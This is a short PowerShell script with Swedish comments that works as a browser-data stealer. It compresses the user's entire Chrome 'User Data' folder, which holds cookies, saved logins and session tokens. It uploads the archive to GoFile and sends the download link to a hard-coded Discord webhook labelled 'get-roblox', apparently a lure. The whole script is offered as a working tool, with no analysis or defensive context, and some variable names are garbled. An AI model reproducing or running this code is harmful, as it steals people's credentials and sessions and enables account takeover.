Compress-Archive -Path "C:\Users\$env:username\AppData\Local\Google\Chrome\User Data" -DestinationPath "$env:temp\temp.zip" -Force

# Ange filen som ska laddas upp
filePath = "env:temp\temp.zip"

# Skapa en unik boundary-sträng för formuläret
\$boundary = [System.Guid]::NewGuid().ToString()
contentType = "multipart/form-data; boundary=boundary"

# Läs in filen som byte-array
\(fileBytes = [System.IO.File]::ReadAllBytes(\)filePath)
\(fileName = [System.IO.Path]::GetFileName(\)filePath)

# Använd ISO-8859-1 för att korrekt hantera binärdata i strängkonverteringen
\$encoding = [System.Text.Encoding]::GetEncoding("iso-8859-1")

# Bygg upp multipart-strukturhuvudet (GoFile kräver namnet "file")
\$bodyLines = (
    "--\$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
    "Content-Type: application/zip",
    ""
) -join "`r`n" + "`r`n"

\$headerBytes = encoding.GetBytes(bodyLines)
footerBytes = encoding.GetBytes("`r`n--\$boundary--`r`n")

# Kombinera allt till en enda stor byte-kropp
\(requestBytes = New-Object Byte[] (\)headerBytes.Length + fileBytes.Length + footerBytes.Length)
[System.Buffer]::BlockCopy(\$headerBytes, 0, requestBytes, 0, headerBytes.Length)
[System.Buffer]::BlockCopy(fileBytes, 0, requestBytes, headerBytes.Length, fileBytes.Length)
[System.Buffer]::BlockCopy(footerBytes, 0, requestBytes, (headerBytes.Length + fileBytes.Length), footerBytes.Length)

# Skicka anropet (Säkerställ också TLS 1.2 vilket krävs av moderna API:er som GoFile)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

\$response = Invoke-RestMethod -Uri "https://upload.gofile.io/uploadfile" -Method Post -Body requestBytes -ContentType contentType

# Visa resultatet


$link = $response.data.downloadPage

# Byt ut mot din faktiska webhook-URL från Discord
$WebhookUrl = "https://discord.com/api/webhooks/1562163056358989930/a-ZW7q-A3ekHBXZN2GUoAgnVy5B9ZQ2tQQqGDlINUDrGv_DevTKve5cR6qvGMg-C2g5C"

# Skapa meddelandet i ett objekt
$Payload = [PSCustomObject]@{
    content  = $link
    username = "get-roblox" # Valfritt: Ändrar namnet på webhooken temporärt
}

# Konvertera till JSON och skicka
$JsonPayload = $Payload | ConvertTo-Json -Depth 5
Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $JsonPayload -ContentType "application/json"
